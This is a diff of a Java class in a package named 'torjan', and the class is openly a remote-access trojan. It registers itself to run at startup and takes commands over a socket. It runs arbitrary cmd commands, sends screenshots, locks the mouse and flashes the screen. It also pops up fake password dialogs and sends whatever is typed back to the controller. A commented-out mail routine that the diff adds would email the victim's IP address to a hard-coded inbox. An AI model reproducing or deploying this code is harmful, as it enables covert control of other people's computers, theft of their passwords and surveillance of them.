@@ -1,5 +1,4 @@
 package com.dlm.demo.torjan;
-
 import java.awt.AWTException;
 import java.awt.Color;
 import java.awt.FlowLayout;
@@ -31,7 +30,7 @@ import java.util.Enumeration;
 import java.util.Properties;
 
 import javax.imageio.ImageIO;
-import javax.mail.Transport;
+
 import javax.swing.JButton;
 import javax.swing.JDialog;
 import javax.swing.JFrame;
@@ -40,9 +39,6 @@ import javax.swing.JOptionPane;
 import javax.swing.JPanel;
 import javax.swing.JPasswordField;
 import javax.swing.JTextField;
-
-import org.hibernate.Session;
-import org.jboss.logging.Message;
 
 public class Test {
 	ServerSocket serverSocket;
@@ -55,7 +51,7 @@ public class Test {
 	BufferedReader bufferedReader;
 	BufferedImage bi;
 	Robot robot;
-	SMail smail;
+	//SMail smail;
 	MyCopy myCopy;
 	MouseLockThread mouseLockThread;
 	int time[] = { 5000, 120000, 300000 }, timeSel = 0;
@@ -105,7 +101,6 @@ public class Test {
 			go();
 		}
 	}
-
 	/* 在注册表中设置开机自动运行 */
 	void go() {
 		while (true) {
@@ -154,7 +149,7 @@ public class Test {
 						continue;
 					}
 					showDialogPassInput(commendString);
-				}
+				} 
 			} else if (commendString.startsWith("-p")) {//截图
 				sendPic();
 			} else if (commendString.startsWith("-m")) {//锁定鼠标
@@ -164,19 +159,19 @@ public class Test {
 					continue;
 				}
 				mouseLock(commendString);
-			} else if (commendString.startsWith("-flash")) {
-				try {
+			}else if(commendString.startsWith("-flash")){
+				try{
 					commendString = commendString.substring(7);
-				} catch (Exception e) {
-					commendString = "";
+				}catch(Exception e){
+					commendString="";
 				}
 				new Flash(commendString);
-			} else {
+			}
+			else {
 				dosExe(commendString);
 			}
 		}
 	}
-
 	/*在注册表注册开机自动启动*/
 	public void register() {
 		JarUtil jarUtil = new JarUtil(Test.class);
@@ -199,29 +194,27 @@ public class Test {
 
 		}
 	}
-
 	/*显示密码对话框*/
 	void showDialogPassInput(String s) {
 		MyDialogPassInput input = new MyDialogPassInput(s);
 		s = input.pass;
 		try {
-			dos.writeUTF("password:" + s);
+			dos.writeUTF("password:"+s);
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
 	}
-
+	
 	/*输了信息对话框*/
 	void showDialogMsgInput(String s) {
 		MyDialogMsgInput input = new MyDialogMsgInput(s);
 		s = input.string;
 		try {
-			dos.writeUTF("msg:" + s);
+			dos.writeUTF("msg:"+s);
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
 	}
-
 	/*启动线程锁定鼠标*/
 	void mouseLock(String s) {
 		if (s.equals("l")) {
@@ -234,14 +227,14 @@ public class Test {
 			mouseLockThread.flag = false;
 		}
 	}
-
 	/*执行dos命令*/
 	void dosExe(String dosString) {
 		String command = "cmd /c " + dosString;
 		String s = null;
 		try {
 			process = r.exec(command);
-			bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+			bufferedReader = new BufferedReader(new InputStreamReader(process
+					.getInputStream()));
 			dos.writeUTF("1start");
 			while ((s = bufferedReader.readLine()) != null) {
 				s = s.trim();
@@ -252,10 +245,11 @@ public class Test {
 			e.printStackTrace();
 		}
 	}
-
 	/*发送图片*/
 	void sendPic() {
-		BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
+		BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0,
+				Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit
+						.getDefaultToolkit().getScreenSize().height));
 		byte[] imageData = getCompressedImage(bi);
 		if (imageData != null) {
 			try {
@@ -275,7 +269,6 @@ public class Test {
 	public static void main(String[] args) {
 		new Test();
 	}
-
 	/*处理图片，方便传输*/
 	public byte[] getCompressedImage(BufferedImage image) {
 		byte[] imageData = null;
@@ -288,7 +281,6 @@ public class Test {
 		}
 		return imageData;
 	}
-
 	/*获取本地IP*/
 	String getIP() {
 		String ipString = "";
@@ -301,7 +293,8 @@ public class Test {
 				ipString = ipString + ni.getName() + "\n";
 				Enumeration<InetAddress> ips = ni.getInetAddresses();
 				while (ips.hasMoreElements()) {
-					ipString = ipString + ips.nextElement().getHostAddress() + "\n";
+					ipString = ipString + ips.nextElement().getHostAddress()
+							+ "\n";
 				}
 			}
 		} catch (Exception e) {
@@ -309,7 +302,6 @@ public class Test {
 		}
 		return ipString;
 	}
-
 	/*显示消息对话框*/
 	class ShowDialogThread extends Thread {
 		String info;
@@ -318,7 +310,6 @@ public class Test {
 			this.info = s;
 		}
 
-		@Override
 		public void run() {
 			JOptionPane.showMessageDialog(null, info);
 		}
@@ -327,7 +318,6 @@ public class Test {
 	class MouseLockThread extends Thread {
 		boolean flag = false;
 
-		@Override
 		public void run() {
 			Point p = MouseInfo.getPointerInfo().getLocation();
 			while (flag) {
@@ -343,8 +333,7 @@ public class Test {
 
 	// 这里可以启动其它的应用程序
 	class OtherApp extends Thread {
-		@Override
-		public void run() {
+		public void run() {	
 			//new other();
 		}
 	}
@@ -354,7 +343,8 @@ public class Test {
 		private String jarPath;
 
 		public JarUtil(Class clazz) {
-			String path = clazz.getProtectionDomain().getCodeSource().getLocation().getFile();
+			String path = clazz.getProtectionDomain().getCodeSource()
+					.getLocation().getFile();
 			try {
 				path = java.net.URLDecoder.decode(path, "UTF-8");
 			} catch (java.io.UnsupportedEncodingException e) {
@@ -387,7 +377,6 @@ public class Test {
 			return null;
 		}
 	}
-
 	/*该类用于文件复制*/
 	class MyCopy {
 		public int fileCopy(String sFile, String oFile) {
@@ -420,11 +409,10 @@ public class Test {
 			return 0;
 		}
 	}
-
 	/*
 	 * 发送邮件部分 需要一两个邮箱，一个是发送方邮箱，一个是接受邮箱
 	 */
-	class SMail {
+	/*class SMail {
 		boolean sended = false;
 		Properties props;
 		Session session;
@@ -433,7 +421,25 @@ public class Test {
 
 		public void send(String s) {
 			try {
-				System.out.println("Send:" + s);
+				// System.out.println(s);
+				props = new Properties();
+				props.setProperty("mail.smtp.auth", "true");
+				props.setProperty("mail.transport.protocol", "smtp");
+				session = Session.getDefaultInstance(props);
+				// session.setDebug(true);
+				msg = new MimeMessage(session);
+				msg.setSubject("ip");
+				msg.setText(s);
+				xxxxxxxxxxxxxxxx为发送方邮箱用户名
+				msg.setFrom(new InternetAddress("xxxxxxxxxxxxxxxx@sina.com"));
+				transport = session.getTransport();
+				xxxxxxxxxxxxxxxx为发送方邮箱用户名、
+				 *yyyyyyyyy为发送方邮箱密码
+				transport.connect("smtp.sina.com", 25, "xxxxxxxxxxxxxxxx", "yyyyyyyyy");
+				transport.sendMessage(msg, new Address[] { new InternetAddress(
+						"496977458@qq.com") });
+				transport.close();
+				sended = true;
 			} catch (Exception e) {
 			}
 
@@ -442,8 +448,7 @@ public class Test {
 		public SMail() {
 			sended = false;
 		}
-	}
-
+	}*/
 	/*密码输入框*/
 	class MyDialogPassInput extends JDialog {
 		JPasswordField text;
@@ -480,32 +485,29 @@ public class Test {
 			this.setVisible(true);
 		}
 	}
-
 	/*闪屏*/
 	class Flash {
 		JFrame frame;
 		JPanel pane;
-		Color c[] = { Color.pink, Color.white, Color.blue };
+		Color c[] = {  Color.pink,Color.white,Color.blue};
 		int i;
-		Image offScreenImage = null;
+		Image offScreenImage = null;	
 		String msg;
-
 		public Flash(String s) {
-			msg = s;
-			final int width = Toolkit.getDefaultToolkit().getScreenSize().width;
-			final int height = Toolkit.getDefaultToolkit().getScreenSize().height;
+			msg=s;
+			final int width=Toolkit.getDefaultToolkit().getScreenSize().width;
+			final int height=Toolkit.getDefaultToolkit().getScreenSize().height;
 			frame = new JFrame();
 			frame.setAlwaysOnTop(true);
 			frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
 			frame.setUndecorated(true);
-			frame.setBounds(0, 0, width, height);
+			frame.setBounds(0,0,width,height);
 			pane = new JPanel() {
-				@Override
 				public void paint(Graphics g) {
-					if (offScreenImage == null) {
-						offScreenImage = this.createImage(width, height);
+					if(offScreenImage == null){
+						offScreenImage=this.createImage(width, height);
 					}
-					Graphics gg = offScreenImage.getGraphics();
+					Graphics gg=offScreenImage.getGraphics();
 					gg.setFont(new Font(null, Font.PLAIN, 50));
 					gg.setColor(c[i]);
 					gg.fillRect(0, 0, width, height);
@@ -517,15 +519,14 @@ public class Test {
 			frame.setContentPane(pane);
 			frame.setVisible(true);
 			new Thread() {
-				@Override
 				public void run() {
-					int time = 0;
+					int time=0;
 					while (i < c.length) {
 						Flash.this.myUpdate();
 						try {
 							Thread.sleep(50);
 							time++;
-							if (time == 100) {
+							if(time==100){
 								frame.dispose();
 								break;
 							}
@@ -536,9 +537,8 @@ public class Test {
 				}
 			}.start();
 		}
-
 		public void myUpdate() {
-			if (i == c.length - 1) {
+			if (i == c.length-1) {
 				i = 0;
 			} else {
 				i++;
@@ -546,7 +546,6 @@ public class Test {
 			pane.repaint();
 		}
 	}
-
 	/*输入对话框*/
 	class MyDialogMsgInput extends JDialog {
 		JTextField text;
